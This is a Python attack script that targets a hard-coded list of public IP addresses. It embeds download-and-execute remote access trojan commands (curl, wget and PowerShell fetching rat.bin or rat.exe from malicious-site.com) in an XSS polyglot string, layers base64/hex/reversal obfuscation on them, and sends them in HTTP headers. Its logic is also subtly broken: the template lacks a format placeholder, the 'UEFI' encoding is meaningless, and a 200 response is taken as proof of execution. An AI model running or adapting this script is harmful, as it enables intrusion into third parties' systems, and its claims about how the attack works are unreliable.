import requests
import binascii
import time
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable warnings about unverified HTTPS requests
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Predefined list of RHOSTS
RHOSTS = [
    "162.125.248.18",
    "142.251.163.100", "142.251.163.101", "142.251.163.102", "142.251.163.113", "142.251.163.138", "142.251.163.139",
    "142.251.40.238",
    "104.244.42.1", "104.244.42.129", "104.244.42.193", "104.244.42.65",
    "13.107.6.156",
    "162.125.248.18",
    "142.251.163.100", "142.251.163.101", "142.251.163.102", "142.251.163.113", "142.251.163.138", "142.251.163.139",
    "142.251.40.238",
    "104.244.42.1", "104.244.42.129", "104.244.42.193", "104.244.42.65",
    "13.107.6.156"
]

external_payloads = []

# Polyglot JavaScript code template with a placeholder for injection
polyglot_template = "/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+{}//'>"

# RAT (Remote Access Trojan) payloads
rat_payloads = [
    "curl -O http://malicious-site.com/rat.bin && chmod +x rat.bin && ./rat.bin",  # Download and execute RAT
    "wget http://malicious-site.com/rat.bin -O rat.bin && chmod +x rat.bin && ./rat.bin",  # Alternative download method
    "powershell -Command \"Invoke-WebRequest -Uri http://malicious-site.com/rat.exe -OutFile rat.exe; Start-Process rat.exe\""  # Windows PowerShell RAT download
]

# Function to inject the RAT payload into the polyglot template
def create_polyglot_payload(rat_payload):
    # Replace the placeholder in the polyglot template with the actual RAT payload
    return polyglot_template.format(rat_payload)

# Function to generate the payloads with polyglot obfuscation
def generate_payloads():
    global payloads
    payloads = []
    for rat_payload in rat_payloads:
        polyglot_payload = create_polyglot_payload(rat_payload)
        payloads.append(polyglot_payload)

    if external_payloads:
        print(f"Adding {len(external_payloads)} external payloads from file.")
        payloads.extend(external_payloads)

# Function to obfuscate using UEFI-specific techniques if polyglot fails
def uefi_encode(payload):
    # First layer of encoding: Base64
    base64_encoded = binascii.b2a_base64(payload.encode()).decode().strip()

    # Second layer: Hex encoding
    hex_encoded = binascii.hexlify(base64_encoded.encode()).decode()

    # Third layer: Reversing the hex string to further obfuscate
    reversed_hex = hex_encoded[::-1]

    return reversed_hex

# Function to split and reassemble the payload
def split_and_reassemble(payload, chunk_size=50):
    chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
    reassembled = "||".join(chunks)
    return reassembled

# Recursive function to learn and adjust obfuscation
def recursive_obfuscation(ip, payload, iteration, max_iterations=100):
    if iteration > max_iterations:
        print(f"Max iterations reached for {ip}. Moving to next target.")
        return False

    headers = {}
    headers[f"Header-1023"] = payload  # Insert the payload into the last header
    try:
        response = requests.get(f"https://{ip}:443", headers=headers, verify=False, timeout=15)
        print(f"[Iteration {iteration}] Response code: {response.status_code}")

        if response.status_code == 200:
            print(f"RAT payload executed successfully on {ip}.")
            return True
        else:
            print(f"Failed to execute RAT on {ip}. Adjusting obfuscation and retrying...")

            # Adjust payload using UEFI-specific techniques
            uefi_encoded_payload = uefi_encode(payload)
            if uefi_encoded_payload:
                reassembled_payload = split_and_reassemble(uefi_encoded_payload)
                return recursive_obfuscation(ip, reassembled_payload, iteration + 1, max_iterations)

    except requests.exceptions.RequestException as e:
        print(f"Error sending payload to {ip}: {e}")
        return False

# Function to load external payloads from a .txt file
def load_external_payloads(file_path):
    global external_payloads
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as file:
                for line in file:
                    line = line.strip()
                    if line:
                        polyglot_payload = create_polyglot_payload(line)
                        external_payloads.append(polyglot_payload)
            print(f"Loaded {len(external_payloads)} payloads from {file_path}.")
        except Exception as e:
            print(f"Error loading payloads from file: {file_path}. Error: {e}")
    else:
        print(f"File not found: {file_path}. No external payloads loaded.")

# Main entry function
def init():
    # Get the number of iterations from the user
    iterations = input("Enter the number of iterations for the polyglot brute force function (default is 100): ").strip()
    if not iterations.isdigit():
        iterations = 100
    else:
        iterations = int(iterations)

    # Optionally load external payloads from a .txt file
    file_path = input("Enter the file path for additional payloads (leave blank if none): ").strip()
    if file_path:
        load_external_payloads(file_path)

    # Generate polyglot-obfuscated payloads
    generate_payloads()

    # Iterate through each RHOST and payload
    for rhost in RHOSTS:
        print(f"\n[*] Targeting {rhost}")
        for payload in payloads:
            if not recursive_obfuscation(rhost, payload, 1, iterations):
                print(f"Failed to execute RAT on {rhost} after {iterations} iterations.")

# Start the script
if __name__ == "__main__":
    init()
